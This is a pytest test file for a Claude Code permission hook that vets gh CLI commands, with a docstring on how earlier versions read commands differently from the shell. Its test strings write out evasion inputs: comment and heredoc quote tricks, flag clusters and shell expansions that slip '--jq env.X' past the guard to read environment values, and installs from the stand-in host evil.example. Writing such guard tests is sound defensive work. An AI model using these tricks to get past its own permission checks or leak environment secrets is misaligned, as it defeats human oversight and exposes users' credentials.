"""Round-4 additions on clauDNA #369: two ways the round-3 guard still read a command differently from the shell.

1. Comments. With shlex comments off, an apostrophe or a double quote inside a comment (or a heredoc body) opens a
   quote for the tokenizer that the shell never sees; two of them on different lines pair up and hide the gh call
   between them, and a single one sends the whole command down the lenient fallback, which splits a quoted --jq value
   at a pipe or a paren. Each physical line is now read on its own too, and `#` starts a comment only where bash starts
   one (at a word start, outside quotes).
2. Shorthand clusters. pflag reads `-dq EXPR` as `-d -q EXPR` and `-dR HOST/o/r` as `-d -R HOST/o/r` (real gh 2.92:
   `-dz` fails with "unknown shorthand flag", `-dq` and `-dR` parse). Neither the decider nor the pre-filter read them.
3. Expansions. The shell expands a word before gh reads it, so `$'--jq'`, `${X---jq}`, `--j${Z}q` and
   `{--jq,x}` reach gh as --jq while the decider reads the unexpanded text. Under a narrow grant the hook
   approved them itself, so Claude Code's own check never saw them; it now leaves them to that check. A word
   that is only a parameter (`gh pr view "$N"`) stays approved.
4. A HOST/OWNER/REPO positional. `gh repo view|clone|fork ...` take a repository as a positional, and a
   three-part one names its host the way -R does.
Each deny case is red on 3f80509 and green with the change. Fake values only."""

from __future__ import annotations

import importlib.util
import json
import subprocess
from pathlib import Path

import pytest

_ROOT = Path(__file__).resolve().parent.parent
_spec = importlib.util.spec_from_file_location(
    "gh_guard_decide", _ROOT / "plugin-hooks" / "gh-guard-decide.py"
)
mod = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(mod)
HOOK = _ROOT / "plugin-hooks" / "pretooluse-permissions.sh"

G = "gh pr list --json number --jq env.X"
GP = "gh pr list --json number --jq '.[] | env.X'"


def verdict(cmd: str) -> str:
    return mod.decide(cmd)[0]


@pytest.mark.parametrize(
    "cmd",
    [
        f"echo ok # it's\n{G}\necho ok # don't",  # apostrophes in two comments pair up around the call
        f'echo ok # say "hi\n{G}\necho ok # bye"',  # the same with double quotes
        f"gh pr list --limit 1 # it's\n{G}\ngh pr list --limit 1 # don't",  # every line a granted gh
        f"# it's\n{G}\n# don't",
        f"cat <<'EOF'\nit's prose\nEOF\n{G}\ncat <<'EOF'\nthat's prose\nEOF",  # heredoc bodies do the same
        f"{GP}\n# it's fine",  # one apostrophe: the lenient split must not mangle the quoted jq at its pipe
        f"{GP} # it's",
        f"cat <<'EOF'\nit's prose\nEOF\n{GP}",
        f"echo a#b; {G}",  # a # inside a word is not a comment in bash
        f'echo "a #b"; {G}',  # nor inside double quotes
        f"echo 'a #b'; {G}",  # nor inside single quotes
        "gh pr list --json number -dq env.X",  # a shorthand cluster: --draft, then --jq
        "gh pr list --json number -dqenv.X",  # the same with the value glued on
        "gh api repos/o/r -iq env.X",
        "gh pr list -dR evil.example/o/r --search x",  # --draft, then --repo naming a host
        "gh pr list -dRevil.example/o/r --search x",
        "gh pr list -wR o/r",  # --web inside a cluster
        "gh pr list --json number -dt '{{env}}'",
    ],
)
def test_a_reading_that_differs_from_the_shell_is_denied(cmd):
    assert verdict(cmd) == "deny", cmd


@pytest.mark.parametrize(
    "cmd",
    [
        "gh pr list --json title --jq '.[].title' # it's fine",
        "gh pr list --json title --jq '.[] | select(.title|test(\"x\")) | .title' # it's fine",
        'gh pr comment 5 -R o/r --body "it\'s fine" # done',
        "cat <<'EOF'\ndon't use gh here\nEOF\ngh pr list --json number",
        "gh pr list --json number --jq '.[] | .env'",
        "echo $#; gh pr list --json number",  # `$#` is not a comment
        "gh pr list -d --json number,title",  # a lone bool shorthand
        "gh pr list -l bug -S 'query' --json number",
        "gh run list -w build --json number",  # -w is --workflow here, alone or clustered
        "gh run list -dw build --json number",
        "gh pr list -L30 --json number",
        "gh api repos/o/r -X GET --jq '.name'",
    ],
)
def test_ordinary_calls_stay_allowed(cmd):
    assert verdict(cmd) == "allow", cmd


def _hook(tmp_path: Path, cmd: str, allow: list[str]) -> str:
    (tmp_path / ".claude").mkdir(exist_ok=True)
    (tmp_path / ".claude" / "settings.json").write_text(
        json.dumps({"permissions": {"allow": allow}})
    )
    p = subprocess.run(
        ["bash", str(HOOK)],
        input=json.dumps({"tool_name": "Bash", "tool_input": {"command": cmd}}),
        capture_output=True,
        text=True,
        cwd=tmp_path,
        env={"HOME": str(tmp_path), "PATH": "/usr/bin:/bin"},
        timeout=20,
    )
    return (
        "deny"
        if '"permissionDecision":"deny"' in p.stdout
        else "allow"
        if '"permissionDecision":"allow"' in p.stdout
        else "prompt"
    )


@pytest.mark.parametrize(
    "cmd",
    [
        "gh pr list --json number -dq env.X",  # the pre-filter must trigger on a cluster
        "gh pr list -dR evil.example/o/r --search x",
        "gh pr list -wR o/r",
        "gh pr list --json number --j\\\nq env.X",  # a backslash-newline joins before the flag is read
        "g\\\nh pr list --json number --jq env.X",
        "gh pr list --json number -\\\nq env.X",
        "gh pr list -\\\nR evil.example/o/r --search x",
        "gh pr list --limit 1 # it's\ngh pr list --json number --jq env.X\ngh pr list --limit 1 # don't",
    ],
)
def test_the_hook_denies_these_under_a_narrow_and_a_bare_grant(tmp_path, cmd):
    for allow in (["Bash(gh pr list *)"], ["Bash"]):
        assert _hook(tmp_path, cmd, allow) == "deny", (allow, repr(cmd))


# -- 3. An expansion that can form or change an option word is left to Claude Code's own check --------------
NARROW = ["Bash(gh pr list *)", "Bash(gh pr view *)", "Bash(gh api *)", "Bash(echo *)", "Bash(env *)"]


@pytest.mark.parametrize(
    "cmd",
    [
        "gh pr list --json number $'--jq' env.X",  # ANSI-C quoting
        'gh pr list --json number $"--jq" env.X',  # locale quoting
        "gh pr list --json number ${X---jq} env.X",  # a default value
        "gh pr view ${N:-5}",  # an operator that puts command text into the word
        "gh pr list --json number ${X:+--jq} env.X",
        "gh pr list --json number ${X/a/--jq} env.X",
        "env gh pr list --json number $'--jq' env.X",  # behind a wrapper the gh guard looks through
        "gh pr list --json number --j${Z}q env.X",  # an expansion inside an option word
        "gh pr list --json number -$Q env.X",
        "gh pr list --json number --jq=$Q",
        "gh pr list --json number $Z--jq env.X",  # an empty expansion in front of a dash
        'gh pr list --json number "$Z"--jq env.X',
        'gh pr list --json number "--jq=.[] | e${Z}nv.X"',
        "gh pr list --json number {--jq,env.X}",  # brace expansion
        "gh pr list --json number --j? env.X",  # an unquoted glob inside an option word
        "gh pr list --json number *",  # an unquoted glob that starts a word
    ],
)
def test_an_expansion_that_can_form_an_option_is_not_approved(tmp_path, cmd):
    assert _hook(tmp_path, cmd, NARROW) == "prompt", cmd


@pytest.mark.parametrize(
    "cmd",
    [
        'gh pr view "$N"',
        "gh pr view $N",
        'gh pr view "${N}" --json title',
        "gh pr view $1 --json title --jq .title",
        'gh pr view 5 --repo "$REPO"',
        "gh api repos/$OWNER/$REPO/pulls",
        'gh pr list --search "author:$USER" --json number',
        "gh api repos/{owner}/{repo}/pulls",  # gh's own placeholders, not a brace expansion
        "gh pr list --json number --jq .[].number",  # a glob character after a word's first letter
        "gh pr list --search 'cost$' --json number",  # a quoted or an escaped dollar is text
        "gh pr list --search price\\$ --json number",
        "gh api graphql -f query='{ viewer { login } }'",
        'gh pr list --search "${Q#*:}" --json number',  # a strip or an index only reads the variable
        "gh pr view ${ARR[0]}",
        "echo $'a\\tb'",  # not a gh command: unchanged
        'echo "gh rc=${PIPESTATUS[0]}"',  # an echo that mentions gh is not a gh command
        "echo gh $'--jq'",
    ],
)
def test_a_plain_parameter_and_other_expansions_stay_approved(tmp_path, cmd):
    assert _hook(tmp_path, cmd, NARROW) == "allow", cmd


# -- 4. A HOST/OWNER/REPO positional names its host the way -R does ----------------------------------------
@pytest.mark.parametrize(
    "cmd",
    [
        "gh repo view evil.example/o/r",
        "gh repo view --json name,url evil.example/o/r",  # an option's value is not the repository
        "gh repo view -b main evil.example/o/r",
        "gh repo clone evil.example/o/r",
        "gh repo clone -u up evil.example/o/r",
        "gh repo clone -- evil.example/o/r",  # after --, every word is positional
        "gh repo fork --org myorg evil.example/o/r --clone",
        "gh repo sync evil.example/o/r --source o/src",
        "gh repo edit evil.example/o/r --description x",
        "gh repo delete evil.example/o/r --yes",
        "gh repo archive -y evil.example/o/r",
        "gh repo unarchive evil.example/o/r",
        "gh repo set-default evil.example/o/r",
        "gh repo create evil.example/o/r --private",
        "gh repo new evil.example/o/r",
        "gh label clone evil.example/o/r",
        "gh extension install evil.example/o/r",
        "gh ext install evil.example/o/r",
        "gh skill install evil.example/o/r",
        "gh skills add evil.example/o/r",
        "gh skill preview evil.example/o/r",
        "gh repo view evil.example:8443/o/r",
        "gh repo view Evil.Example/o/r",
        "gh repo view $X evil.example/o/r",  # an empty unquoted word moves the repository up a place
        "gh $X repo view evil.example/o/r",
    ],
)
def test_a_repository_positional_on_another_host_is_denied(cmd):
    assert verdict(cmd) == "deny", cmd


@pytest.mark.parametrize(
    "cmd",
    [
        "gh repo view o/r",
        "gh repo view github.com/o/r",
        "gh repo view GITHUB.COM/o/r",
        "gh repo view",
        "gh repo view -b feature/a/b o/r",  # a branch with slashes is an option's value
        "gh repo view --branch release/v1.2/x",
        "gh repo clone o/r src/o/r",  # the second positional is a directory
        'gh repo clone "$R" src/o/r',
        "gh repo clone o/r -- --depth 1",
        "gh repo fork o/r -- a/b/c",
        "gh repo sync o/fork -b a/b/c",
        "gh repo clone ./o/r",  # a local path names no host
        "gh skill install --from-local skills/a/b",
        "gh extension install .",
        "gh api repos/o/r",  # gh api takes a path, not a repository
        "gh api evil.example/o/r",
        "gh repo list someowner",
    ],
)
def test_a_repository_positional_on_github_stays_allowed(cmd):
    assert verdict(cmd) == "allow", cmd


def test_a_repository_on_the_configured_host_is_allowed():
    assert mod.decide("gh repo view ghe.example/o/r", gh_host="ghe.example")[0] == "allow"


@pytest.mark.parametrize(
    "cmd",
    [
        "gh repo view evil.example/o/r",
        "gh  repo  clone evil.example/o/r",
        "gh repo view $X evil.example/o/r",
    ],
)
def test_the_hook_reads_a_repository_positional(tmp_path, cmd):
    for allow in (["Bash(gh repo view *)", "Bash(gh repo clone *)"], ["Bash"]):
        assert _hook(tmp_path, cmd, allow) == "deny", (allow, cmd)


def test_the_hook_still_approves_a_repository_on_github(tmp_path):
    assert _hook(tmp_path, "gh repo view o/r --json name", ["Bash(gh repo view *)"]) == "allow"


def test_the_documented_trade_is_a_code_span_in_a_heredoc_body():
    """Prose in a heredoc body that holds a gh call with a denied flag is read as a command: in recorded
    traffic, a markdown code span (a backtick starts a command for this reading), not a line that starts
    with the call. Such prose is written with the file tools and passed with --body-file."""
    cmd = "cat > notes.md <<'EOF'\n| probe | `gh api user --jq 'env.X'` |\nEOF"
    assert verdict(cmd) == "deny"
